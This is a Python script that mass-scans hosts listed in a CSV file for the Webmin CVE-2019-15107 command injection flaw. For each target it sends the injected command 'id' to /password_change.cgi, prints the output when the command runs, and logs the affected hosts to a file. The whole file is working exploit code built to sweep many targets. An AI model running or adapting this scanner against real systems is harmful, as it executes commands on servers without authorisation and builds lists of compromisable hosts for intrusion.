#!/usr/bin/env python
import requests
import csv
import sys
import threading
from queue import Queue
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Counters (thread-safe with locks)
total_hosts = 0
vulnerable_hosts = 0
non_vulnerable_hosts = 0
errors = 0
counter_lock = threading.Lock()

# Queue for targets
target_queue = Queue()

def print_status():
    with counter_lock:
        print(f"\n{Fore.CYAN}[STATUS]{Style.RESET_ALL} "
              f"Scanned: {total_hosts} | "
              f"{Fore.GREEN}Vulnerable: {vulnerable_hosts}{Style.RESET_ALL} | "
              f"{Fore.YELLOW}Non-Vulnerable: {non_vulnerable_hosts}{Style.RESET_ALL} | "
              f"{Fore.RED}Errors: {errors}{Style.RESET_ALL}\n")

def check_vulnerability(ip, port):
    url = f"http://{ip}:{port}/password_change.cgi"
    headers = {
        "Host": f"{ip}:{port}",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Testing CVE-2019-15107)"
    }
    payload = "expired=id"

    try:
        response = requests.post(
            url, 
            headers=headers, 
            data=payload, 
            timeout=10, 
            verify=False,
            allow_redirects=False
        )
        
        if "uid=" in response.text:
            with counter_lock:
                global vulnerable_hosts
                vulnerable_hosts += 1
            print(f"{Fore.GREEN}[+] VULNERABLE: {ip}:{port}{Style.RESET_ALL}")
            print(f"    Command output: {response.text.strip()}")
            with open('vulnerable_hosts.txt', 'a') as f:
                f.write(f"{ip}:{port}\n")
            return True
        else:
            with counter_lock:
                global non_vulnerable_hosts
                non_vulnerable_hosts += 1
            print(f"{Fore.YELLOW}[-] Not vulnerable: {ip}:{port}{Style.RESET_ALL}")
            return False
            
    except requests.exceptions.RequestException as e:
        with counter_lock:
            global errors
            errors += 1
        print(f"{Fore.RED}[!] Error: {ip}:{port} - {str(e)}{Style.RESET_ALL}")
        return False

def worker():
    while not target_queue.empty():
        ip, port = target_queue.get()
        check_vulnerability(ip, port)
        with counter_lock:
            global total_hosts
            total_hosts += 1
        print_status()
        target_queue.task_done()

def process_csv(csv_file, thread_count=1):
    with open(csv_file, newline='') as csvfile:
        reader = csv.DictReader(csvfile, fieldnames=['HOST', 'IP', 'PORT'])
        for row in reader:
            ip = row['IP'].strip()
            port = row['PORT'].strip() if row['PORT'] else '10000'
            target_queue.put((ip, port))

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    target_queue.join()

def print_summary():
    print(f"\n{Fore.CYAN}=== SCAN SUMMARY ===")
    print(f"{Fore.GREEN}Vulnerable hosts: {vulnerable_hosts}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Non-vulnerable hosts: {non_vulnerable_hosts}{Style.RESET_ALL}")
    print(f"{Fore.RED}Errors: {errors}{Style.RESET_ALL}")
    print(f"Total hosts scanned: {total_hosts}{Style.RESET_ALL}")
    
    if vulnerable_hosts > 0:
        print(f"\n{Fore.GREEN}Vulnerable hosts saved to 'vulnerable_hosts.txt'{Style.RESET_ALL}")

if __name__ == "__main__":
    csv_file = 'targets.csv'
    thread_count = 1
    
    # Parse arguments
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == '--threads' and i + 1 < len(args):
            try:
                thread_count = int(args[i+1])
                if thread_count < 1:
                    raise ValueError
                i += 2
            except ValueError:
                print(f"{Fore.RED}[!] Invalid thread count. Using default (1){Style.RESET_ALL}")
                thread_count = 1
                i += 2
        else:
            csv_file = args[i]
            i += 1
    
    print(f"{Fore.CYAN}[*] Starting Webmin CVE-2019-15107 Scanner{Style.RESET_ALL}")
    print(f"[*] Loading targets from: {csv_file}")
    print(f"[*] Using {thread_count} thread{'s' if thread_count > 1 else ''}")
    
    try:
        process_csv(csv_file, thread_count)
        print_summary()
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Error: File {csv_file} not found{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
